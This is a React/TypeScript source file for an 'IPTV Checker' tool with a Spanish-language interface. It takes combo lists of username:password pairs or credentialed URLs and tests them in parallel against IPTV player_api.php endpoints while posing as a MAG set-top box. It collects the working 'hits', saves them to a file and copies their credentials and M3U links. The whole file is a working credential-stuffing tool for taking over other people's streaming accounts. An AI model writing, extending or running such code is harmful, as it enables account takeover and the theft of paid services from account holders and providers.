'use client'

import { useState, useCallback, useRef } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Copy, Play, Square, Loader2, Upload, ExternalLink,
  RotateCcw, ChevronDown, ChevronUp, X, Save, FolderOpen
} from 'lucide-react'
import { toast } from 'sonner'

// ============================================================
// Types
// ============================================================

interface IptvResult {
  id: string
  url: string
  status: 'hit' | 'bad' | 'timeout' | 'checking'
  host?: string
  username?: string
  password?: string
  info?: {
    status?: string
    active_cons?: string
    max_connections?: string
    created_at?: string
    exp_date?: string
    timezone?: string
    channels?: string
    films?: string
    series?: string
    real_url?: string
    real_port?: string
    m3u_url?: string
    [key: string]: unknown
  }
}

interface SavedSession {
  id: string
  inputMode: 'url' | 'combo'
  serverHost: string
  totalLines: number
  results: IptvResult[]
  stats: { total: number; hits: number; bad: number; timeout: number; totalLines: number }
  createdAt: string
}

// ============================================================
// STB Headers (same as server-side)
// ============================================================

const STB_HEADERS: Record<string, string> = {
  'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
  'X-User-Agent': 'Model: MAG254; Link: Ethernet',
  'Connection': 'Keep-Alive',
  'Accept-Encoding': 'gzip, deflate',
  'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
}

// ============================================================
// Helpers
// ============================================================

function formatDate(val: string | number | null | undefined): string {
  if (!val || val === 'null') return 'N/A'
  if (typeof val === 'number') {
    if (val === 0) return 'Unlimited'
    return new Date(val * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  const num = Number(val)
  if (!isNaN(num) && num > 0) {
    return new Date(num * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
  }
  return String(val)
}

/** Check a single IPTV line DIRECTLY from the client */
async function checkLineDirect(
  line: string,
  inputMode: 'url' | 'combo',
  serverHost: string
): Promise<Omit<IptvResult, 'id'>> {
  let sHost = ''
  let username = ''
  let password = ''

  if (inputMode === 'combo' && serverHost) {
    const parts = line.split(':')
    if (parts.length < 2) return { status: 'bad', host: '', username: '', url: '' }
    username = parts[0].trim()
    password = parts.slice(1).join(':').trim()
    let h = serverHost.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
    sHost = h
  } else {
    let parsedUrl: URL
    try {
      parsedUrl = new URL(line)
    } catch {
      return { status: 'bad', host: '', username: '', url: '' }
    }
    const hostname = parsedUrl.hostname
    const port = parsedUrl.port || '80'
    sHost = `${hostname}:${port}`
    username = parsedUrl.searchParams.get('username') || ''
    password = parsedUrl.searchParams.get('password') || ''
    if (!username || !password) return { status: 'bad', host: '', username: '', url: '' }
  }

  const apiUrl = `http://${sHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u`

  try {
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 15000)

    const response = await fetch(apiUrl, {
      signal: controller.signal,
      headers: STB_HEADERS,
    })

    clearTimeout(timeoutId)
    const text = await response.text()

    if (text.includes('username')) {
      try {
        const json = JSON.parse(text)
        const userInfo = json?.user_info || {}
        const serverInfo = json?.server_info || {}
        const accountStatus = String(userInfo.status || '')

        if (accountStatus === 'Active') {
          const m3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
          const realUrl = serverInfo?.url ? String(serverInfo.url) : ''
          const realPort = serverInfo?.port ? String(serverInfo.port) : ''

          return {
            status: 'hit',
            url: m3uUrl,
            host: sHost,
            username,
            password,
            info: {
              status: userInfo.status || 'Active',
              active_cons: String(userInfo.active_cons ?? '0'),
              max_connections: String(userInfo.max_connections ?? '0'),
              created_at: formatDate(userInfo.created_at),
              exp_date: formatDate(userInfo.exp_date),
              timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
              channels: 'N/A',
              films: 'N/A',
              series: 'N/A',
              real_url: realUrl,
              real_port: realPort,
              m3u_url: m3uUrl,
            },
          }
        }
      } catch {
        if (text.includes('Active')) {
          const fallbackM3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
          return {
            status: 'hit',
            url: fallbackM3uUrl,
            host: sHost,
            username,
            password,
            info: {
              status: 'Active',
              active_cons: '0',
              max_connections: '0',
              created_at: 'N/A',
              exp_date: 'N/A',
              timezone: 'N/A',
            },
          }
        }
      }
    }

    return { status: 'bad', host: sHost, username, url: '' }
  } catch (fetchError: unknown) {
    if (fetchError instanceof DOMException && fetchError.name === 'AbortError') {
      return { status: 'timeout', host: sHost, username, url: '' }
    }
    return { status: 'bad', host: sHost, username, url: '' }
  }
}

// ============================================================
// localStorage persistence
// ============================================================

const STORAGE_KEY = 'hjtools_iptv_sessions'

function getSavedSessions(): SavedSession[] {
  if (typeof window === 'undefined') return []
  try {
    const raw = localStorage.getItem(STORAGE_KEY)
    return raw ? JSON.parse(raw) : []
  } catch {
    return []
  }
}

function saveSessions(sessions: SavedSession[]) {
  if (typeof window === 'undefined') return
  try {
    // Keep only last 20 sessions
    const trimmed = sessions.slice(-20)
    localStorage.setItem(STORAGE_KEY, JSON.stringify(trimmed))
  } catch {
    // localStorage full, ignore
  }
}

function saveCurrentSession(session: SavedSession) {
  const sessions = getSavedSessions()
  const idx = sessions.findIndex(s => s.id === session.id)
  if (idx >= 0) {
    sessions[idx] = session
  } else {
    sessions.push(session)
  }
  saveSessions(sessions)
}

// ============================================================
// Animated stat number component
// ============================================================

function AnimatedStat({ value, color }: { value: number; color: string }) {
  return (
    <motion.span
      key={value}
      initial={{ opacity: 0.5, y: -4 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.2 }}
      className={`text-base font-bold font-mono ${color}`}
    >
      {value}
    </motion.span>
  )
}

// ============================================================
// Main Component
// ============================================================

export function IptvChecker() {
  // ---- Form state ----
  const [comboList, setComboList] = useState('')
  const [serverHost, setServerHost] = useState('')
  const [threads, setThreads] = useState('5')
  const [inputMode, setInputMode] = useState<'url' | 'combo'>('url')
  const [fileName, setFileName] = useState('')
  const [lineCount, setLineCount] = useState(0)
  const fileInputRef = useRef<HTMLInputElement>(null)

  // ---- Job state ----
  const [isRunning, setIsRunning] = useState(false)
  const [results, setResults] = useState<IptvResult[]>([])
  const [stats, setStats] = useState({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines: 0 })
  const [progress, setProgress] = useState(0)
  const stopRef = useRef(false)
  const resultsRef = useRef<IptvResult[]>([])
  const statsRef = useRef(stats)
  const currentSessionIdRef = useRef<string | null>(null)

  // ---- Saved sessions ----
  const [showHistory, setShowHistory] = useState(false)
  const [viewingSession, setViewingSession] = useState<SavedSession | null>(null)

  // ---- Keep refs in sync ----
  resultsRef.current = results
  statsRef.current = stats

  // ---- Mode switch handler ----
  const switchMode = useCallback((mode: 'url' | 'combo') => {
    if (isRunning) return
    setInputMode(mode)
    setResults([])
    setStats({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines: 0 })
    setProgress(0)
    setComboList('')
    setFileName('')
    setLineCount(0)
    stopRef.current = false
  }, [isRunning])

  // ---- File upload handler ----
  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    if (!file.name.endsWith('.txt')) {
      toast.error('Solo archivos .txt')
      return
    }
    const reader = new FileReader()
    reader.onload = (ev) => {
      const text = ev.target?.result as string
      setComboList(text)
      setFileName(file.name)
      const lines = text.trim().split('\n').filter(l => l.trim())
      setLineCount(lines.length)
      toast.success(`${lines.length} combos cargados de ${file.name}`)
    }
    reader.readAsText(file)
    e.target.value = ''
  }, [])

  // ---- Start check (ALL CLIENT-SIDE) ----
  const startCheck = useCallback(async () => {
    const allLines = comboList.trim().split('\n').filter(l => l.trim())
    if (allLines.length === 0) {
      toast.error('Carga un combo o pega líneas')
      return
    }
    if (inputMode === 'combo' && !serverHost.trim()) {
      toast.error('Ingresa el servidor (host:port)')
      return
    }

    const sessionId = crypto.randomUUID()
    currentSessionIdRef.current = sessionId
    const concurrency = Math.min(Math.max(parseInt(threads) || 5, 1), 20)
    const totalLines = allLines.length

    setIsRunning(true)
    setResults([])
    setStats({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines })
    setProgress(0)
    resultsRef.current = []
    stopRef.current = false

    let processed = 0
    let hits = 0
    let bad = 0
    let timeout = 0

    // Process in batches
    for (let i = 0; i < allLines.length; i += concurrency) {
      if (stopRef.current) break

      const batch = allLines.slice(i, i + concurrency)
      const batchPromises = batch.map(async (line, idx) => {
        if (stopRef.current) return null
        const result = await checkLineDirect(line.trim(), inputMode, serverHost.trim())
        return {
          id: `line-${i + idx}-${Date.now()}`,
          url: result.url || line.trim(),
          status: result.status,
          host: result.host,
          username: result.username,
          password: result.password,
          info: result.info,
        } as IptvResult
      })

      const batchResults = await Promise.all(batchPromises)
      const validResults = batchResults.filter((r): r is IptvResult => r !== null)

      // Update counts
      for (const r of validResults) {
        processed++
        if (r.status === 'hit') hits++
        else if (r.status === 'timeout') timeout++
        else bad++
      }

      // Update state
      const newResults = [...resultsRef.current, ...validResults]
      resultsRef.current = newResults
      setResults(newResults)

      const newStats = { total: processed, hits, bad, timeout, totalLines }
      statsRef.current = newStats
      setStats(newStats)
      setProgress(totalLines > 0 ? Math.round((processed / totalLines) * 100) : 0)

      // Save progress to localStorage
      if (currentSessionIdRef.current === sessionId) {
        saveCurrentSession({
          id: sessionId,
          inputMode,
          serverHost: serverHost.trim(),
          totalLines,
          results: newResults,
          stats: newStats,
          createdAt: new Date().toISOString(),
        })
      }
    }

    setIsRunning(false)
    stopRef.current = false

    if (!stopRef.current || processed === totalLines) {
      toast.success(`Verificación completada: ${hits} hits`)
    } else {
      toast.info('Verificación cancelada')
    }
  }, [comboList, inputMode, serverHost, threads])

  // ---- Stop check ----
  const stopCheck = useCallback(() => {
    stopRef.current = true
    setIsRunning(false)
  }, [])

  // ---- Save hits to file ----
  const saveHitsToFile = useCallback(() => {
    const hitResults = results.filter(r => r.status === 'hit')
    if (hitResults.length === 0) {
      toast.error('No hay hits para guardar')
      return
    }
    const text = hitResults.map((r, idx) => {
      const info = r.info
      const m3uUrl = info?.m3u_url || r.url
      return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}\n`
    }).join('\n---\n\n')

    const blob = new Blob([text], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `hits_${new Date().toISOString().slice(0, 10)}.txt`
    a.click()
    URL.revokeObjectURL(url)
    toast.success(`${hitResults.length} hits guardados`)
  }, [results])

  // ---- Derived ----
  const hitResults = results.filter(r => r.status === 'hit')
  const savedSessions = typeof window !== 'undefined' ? getSavedSessions() : []
  const viewHitResults = viewingSession?.results?.filter(r => r.status === 'hit') || []

  return (
    <div className="space-y-4">
      {/* Input card */}
      <div className="bg-[#111113] theme-card rounded-xl border border-white/[0.06] p-4 space-y-3">
        {/* Mode selector */}
        <div className="flex bg-[#09090b] theme-input rounded-lg border border-white/[0.06] p-0.5">
          <button
            onClick={() => switchMode('url')}
            disabled={isRunning}
            className={`flex-1 py-1.5 rounded-md text-xs font-medium transition-all ${
              inputMode === 'url' ? 'bg-amber-500 text-black' : 'text-white/50 theme-text-dim hover:text-white/70 theme-text-dim'
            }`}
          >
            URL Mode
          </button>
          <button
            onClick={() => switchMode('combo')}
            disabled={isRunning}
            className={`flex-1 py-1.5 rounded-md text-xs font-medium transition-all ${
              inputMode === 'combo' ? 'bg-amber-500 text-black' : 'text-white/50 theme-text-dim hover:text-white/70 theme-text-dim'
            }`}
          >
            Combo Mode
          </button>
        </div>

        {/* Server host (only in combo mode) */}
        {inputMode === 'combo' && (
          <input
            type="text"
            value={serverHost}
            onChange={(e) => setServerHost(e.target.value)}
            disabled={isRunning}
            placeholder="Servidor (host:port) ej: canal-pro.xyz:8080"
            className="w-full bg-[#09090b] theme-input border border-amber-500/30 rounded-lg px-3 py-2.5 text-sm text-white theme-text placeholder-white/20 focus:outline-none focus:border-amber-500/50 font-mono transition-colors disabled:opacity-50"
          />
        )}

        {/* Textarea — only in URL mode */}
        {inputMode === 'url' && (
          <textarea
            value={comboList}
            onChange={(e) => setComboList(e.target.value)}
            disabled={isRunning}
            placeholder="http://host:port/get.php?username=USER&password=PASS"
            rows={4}
            className="w-full bg-[#09090b] theme-input border border-white/[0.08] rounded-lg px-3 py-2.5 text-xs text-white theme-text placeholder-white/20 focus:outline-none focus:border-amber-500/50 focus:ring-1 focus:ring-amber-500/20 font-mono resize-none transition-colors disabled:opacity-50"
          />
        )}

        {/* File upload only in Combo mode */}
        {inputMode === 'combo' && (
          <div>
            <input
              ref={fileInputRef}
              type="file"
              accept=".txt"
              onChange={handleFileUpload}
              className="hidden"
            />
            <button
              onClick={() => fileInputRef.current?.click()}
              disabled={isRunning}
              className="w-full border-2 border-dashed border-white/[0.08] hover:border-amber-500/40 rounded-lg py-4 flex flex-col items-center justify-center gap-1.5 transition-colors group disabled:opacity-50"
            >
              <Upload className="w-5 h-5 text-white/30 theme-text-dim group-hover:text-amber-500/70 transition-colors" />
              <span className="text-xs text-white/40 theme-text-dim group-hover:text-white/60 theme-text-dim transition-colors">
                {fileName ? fileName : 'Subir combo .txt'}
              </span>
              {lineCount > 0 && (
                <span className="text-[10px] text-amber-500/60 font-mono">{lineCount} líneas</span>
              )}
            </button>
          </div>
        )}

        <div className="flex gap-2">
          <input
            type="number"
            value={threads}
            onChange={(e) => setThreads(e.target.value)}
            min="1"
            max="20"
            placeholder="Hilos"
            disabled={isRunning}
            className="w-20 bg-[#09090b] theme-input border border-white/[0.08] rounded-lg px-3 py-2.5 text-sm text-white theme-text focus:outline-none focus:border-amber-500/50 font-mono transition-colors disabled:opacity-50"
          />
          <button
            onClick={startCheck}
            disabled={isRunning}
            className="flex-1 bg-amber-500 hover:bg-amber-400 disabled:opacity-50 disabled:cursor-not-allowed text-black font-semibold rounded-lg py-2.5 text-sm transition-colors flex items-center justify-center gap-2"
          >
            {isRunning ? <Loader2 className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
            {isRunning ? 'Verificando...' : 'Iniciar Check'}
          </button>
          {isRunning && (
            <button
              onClick={stopCheck}
              className="bg-red-500/20 hover:bg-red-500/30 text-red-400 rounded-lg px-3 py-2.5 text-sm transition-colors"
            >
              <Square className="w-4 h-4" />
            </button>
          )}
        </div>
      </div>

      {/* Progress bar */}
      {(isRunning || stats.total > 0) && stats.totalLines > 0 && (
        <div className="space-y-1.5">
          <div className="w-full bg-[#111113] rounded-full h-1.5 overflow-hidden border border-white/[0.06]">
            <motion.div
              className="h-full rounded-full bg-gradient-to-r from-amber-500 to-amber-400"
              initial={{ width: 0 }}
              animate={{ width: `${progress}%` }}
              transition={{ duration: 0.4, ease: 'easeOut' }}
            />
          </div>
          <div className="flex justify-between text-[9px] text-white/30 theme-text-dim font-mono">
            <span>{stats.total} / {stats.totalLines} verificados</span>
            <span>{progress}%</span>
          </div>
        </div>
      )}

      {/* Stats */}
      {stats.total > 0 && (
        <div className="grid grid-cols-4 gap-2">
          {[
            { label: 'Total', value: stats.total, color: 'text-white theme-text' },
            { label: 'Hits', value: stats.hits, color: 'text-green-500' },
            { label: 'Bad', value: stats.bad, color: 'text-red-500' },
            { label: 'Timeout', value: stats.timeout, color: 'text-amber-500' },
          ].map(s => (
            <div key={s.label} className="bg-[#111113] theme-card rounded-xl border border-white/[0.06] p-2.5 text-center">
              <AnimatedStat value={s.value} color={s.color} />
              <p className="text-[9px] text-white/40 theme-text-dim uppercase">{s.label}</p>
            </div>
          ))}
        </div>
      )}

      {/* Hit Results */}
      {hitResults.length > 0 && (
        <div className="space-y-2">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-medium text-green-500/80 uppercase tracking-wider">Hits Encontrados</h3>
            <div className="flex items-center gap-2">
              <button
                onClick={saveHitsToFile}
                className="flex items-center gap-1 text-xs text-green-500 hover:text-green-400 transition-colors"
              >
                <Save className="w-3.5 h-3.5" />
                Guardar
              </button>
              <button
                onClick={() => {
                  const text = hitResults.map((r, idx) => {
                    const info = r.info
                    const m3uUrl = info?.m3u_url || r.url
                    return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nTZ: ${info?.timezone || 'N/A'}\nM3U: ${m3uUrl}`
                  }).join('\n\n')
                  navigator.clipboard.writeText(text)
                  toast.success(`${hitResults.length} hits copiados`)
                }}
                className="flex items-center gap-1 text-xs text-amber-500 hover:text-amber-400 transition-colors"
              >
                <Copy className="w-3.5 h-3.5" />
                Copiar Todo
              </button>
            </div>
          </div>
          <div className="max-h-[60vh] overflow-y-auto space-y-3 custom-scrollbar">
            {hitResults.map((r, i) => {
              const info = r.info
              const m3uUrl = info?.m3u_url || r.url

              const copySingleHit = () => {
                const text = `Hit\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nTZ: ${info?.timezone || 'N/A'}\nM3U: ${m3uUrl}`
                navigator.clipboard.writeText(text)
                toast.success('Hit copiado')
              }

              return (
                <motion.div
                  key={`hit-${i}`}
                  initial={{ opacity: 0, scale: 0.97 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ delay: i * 0.04 }}
                  className="relative overflow-hidden rounded-xl border border-green-500/20"
                >
                  <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-green-500 via-emerald-400 to-green-500" />

                  <div className="p-3.5" style={{ background: 'linear-gradient(to bottom right, rgba(34,197,94,0.07), rgba(16,185,129,0.03))' }}>
                    <div className="flex items-center gap-2 mb-2">
                      <span className="text-[10px] font-bold text-green-400 uppercase tracking-widest">Hit #{i + 1}</span>
                      <div className="flex-1" />
                      <button
                        onClick={copySingleHit}
                        className="p-1 rounded hover:bg-white/[0.06] transition-colors"
                        title="Copiar hit"
                      >
                        <Copy className="w-3.5 h-3.5 text-green-500/60" />
                      </button>
                    </div>

                    <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-xs font-mono">
                      <div><span className="text-white/30 theme-text-dim">User: </span><span className="text-green-300">{r.username}</span></div>
                      <div><span className="text-white/30 theme-text-dim">Pass: </span><span className="text-green-300">{r.password}</span></div>
                      <div><span className="text-white/30 theme-text-dim">Status: </span><span className="text-white/70 theme-text">{info?.status || 'Active'}</span></div>
                      <div><span className="text-white/30 theme-text-dim">Active: </span><span className="text-white/70 theme-text">{info?.active_cons || '0'} / {info?.max_connections || '0'}</span></div>
                      <div><span className="text-white/30 theme-text-dim">Created: </span><span className="text-white/70 theme-text">{info?.created_at || 'N/A'}</span></div>
                      <div><span className="text-white/30 theme-text-dim">Exp: </span><span className="text-white/70 theme-text">{info?.exp_date || 'N/A'}</span></div>
                      {info?.timezone && (
                        <div className="col-span-2"><span className="text-white/30 theme-text-dim">TZ: </span><span className="text-white/70 theme-text">{info.timezone}</span></div>
                      )}
                    </div>

                    <div className="mt-2 flex items-center gap-2">
                      <button
                        onClick={() => { navigator.clipboard.writeText(m3uUrl); toast.success('M3U URL copiada') }}
                        className="flex items-center gap-1 text-[10px] bg-green-500/20 hover:bg-green-500/30 text-green-400 px-2 py-1 rounded-md transition-colors"
                      >
                        <ExternalLink className="w-3 h-3" />
                        M3U Link
                      </button>
                    </div>
                  </div>
                </motion.div>
              )
            })}
          </div>
        </div>
      )}

      {/* Saved Sessions History */}
      {savedSessions.length > 0 && !isRunning && (
        <div className="space-y-2">
          <button
            onClick={() => setShowHistory(!showHistory)}
            className="flex items-center gap-2 text-xs text-white/40 theme-text-dim hover:text-white/60 transition-colors"
          >
            <FolderOpen className="w-3.5 h-3.5" />
            Historial ({savedSessions.length})
            {showHistory ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
          </button>

          <AnimatePresence>
            {showHistory && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                exit={{ opacity: 0, height: 0 }}
                transition={{ duration: 0.2 }}
                className="overflow-hidden"
              >
                <div className="max-h-64 overflow-y-auto space-y-2 custom-scrollbar">
                  {savedSessions.map((session) => (
                    <div
                      key={session.id}
                      className="bg-[#111113] rounded-xl border border-white/[0.06] p-3 flex items-center gap-3"
                    >
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] font-bold uppercase tracking-wider text-green-500">
                            ✓
                          </span>
                          <span className="text-xs text-white/70 theme-text font-mono truncate">
                            {session.inputMode === 'url' ? 'URL Mode' : `Combo: ${session.serverHost}`}
                          </span>
                        </div>
                        <div className="flex items-center gap-3 mt-1 text-[10px] text-white/30 font-mono">
                          <span>{session.totalLines} líneas</span>
                          <span className="text-green-500/60">{session.stats.hits} hits</span>
                          <span className="text-red-500/60">{session.stats.bad} bad</span>
                        </div>
                      </div>
                      <button
                        onClick={() => setViewingSession(viewingSession?.id === session.id ? null : session)}
                        className="text-[10px] bg-white/[0.06] hover:bg-white/[0.1] text-white/60 hover:text-white/80 px-2.5 py-1.5 rounded-md transition-colors flex items-center gap-1 shrink-0"
                      >
                        {viewingSession?.id === session.id ? <X className="w-3 h-3" /> : null}
                        {viewingSession?.id === session.id ? 'Cerrar' : 'Ver hits'}
                      </button>
                    </div>
                  ))}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      )}

      {/* Viewing historical session results */}
      <AnimatePresence>
        {viewingSession && viewHitResults.length > 0 && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="space-y-2"
          >
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-medium text-green-500/80 uppercase tracking-wider">
                Hits de sesión anterior
              </h3>
              <button
                onClick={() => {
                  const text = viewHitResults.map((r, idx) => {
                    const info = r.info
                    const m3uUrl = info?.m3u_url || r.url
                    return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}`
                  }).join('\n\n')
                  navigator.clipboard.writeText(text)
                  toast.success(`${viewHitResults.length} hits copiados`)
                }}
                className="flex items-center gap-1 text-xs text-amber-500 hover:text-amber-400 transition-colors"
              >
                <Copy className="w-3.5 h-3.5" />
                Copiar Todo
              </button>
            </div>
            <div className="max-h-[40vh] overflow-y-auto space-y-3 custom-scrollbar">
              {viewHitResults.map((r, i) => {
                const info = r.info
                const m3uUrl = info?.m3u_url || r.url

                return (
                  <motion.div
                    key={`hist-${r.id}`}
                    initial={{ opacity: 0, scale: 0.97 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: i * 0.03 }}
                    className="relative overflow-hidden rounded-xl border border-green-500/20"
                  >
                    <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-green-500 via-emerald-400 to-green-500" />

                    <div className="p-3.5" style={{ background: 'linear-gradient(to bottom right, rgba(34,197,94,0.07), rgba(16,185,129,0.03))' }}>
                      <div className="flex items-center gap-2 mb-2">
                        <span className="text-[10px] font-bold text-green-400 uppercase tracking-widest">Hit #{i + 1}</span>
                        <div className="flex-1" />
                        <button
                          onClick={() => {
                            const text = `Hit\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}`
                            navigator.clipboard.writeText(text)
                            toast.success('Hit copiado')
                          }}
                          className="p-1 rounded hover:bg-white/[0.06] transition-colors"
                          title="Copiar hit"
                        >
                          <Copy className="w-3.5 h-3.5 text-green-500/60" />
                        </button>
                      </div>

                      <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-xs font-mono">
                        <div><span className="text-white/30 theme-text-dim">User: </span><span className="text-green-300">{r.username}</span></div>
                        <div><span className="text-white/30 theme-text-dim">Pass: </span><span className="text-green-300">{r.password}</span></div>
                        <div><span className="text-white/30 theme-text-dim">Status: </span><span className="text-white/70 theme-text">{info?.status || 'Active'}</span></div>
                        <div><span className="text-white/30 theme-text-dim">Active: </span><span className="text-white/70 theme-text">{info?.active_cons || '0'} / {info?.max_connections || '0'}</span></div>
                        <div><span className="text-white/30 theme-text-dim">Created: </span><span className="text-white/70 theme-text">{info?.created_at || 'N/A'}</span></div>
                        <div><span className="text-white/30 theme-text-dim">Exp: </span><span className="text-white/70 theme-text">{info?.exp_date || 'N/A'}</span></div>
                      </div>

                      <div className="mt-2 flex items-center gap-2">
                        <button
                          onClick={() => { navigator.clipboard.writeText(m3uUrl); toast.success('M3U URL copiada') }}
                          className="flex items-center gap-1 text-[10px] bg-green-500/20 hover:bg-green-500/30 text-green-400 px-2 py-1 rounded-md transition-colors"
                        >
                          <ExternalLink className="w-3 h-3" />
                          M3U Link
                        </button>
                      </div>
                    </div>
                  </motion.div>
                )
              })}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}
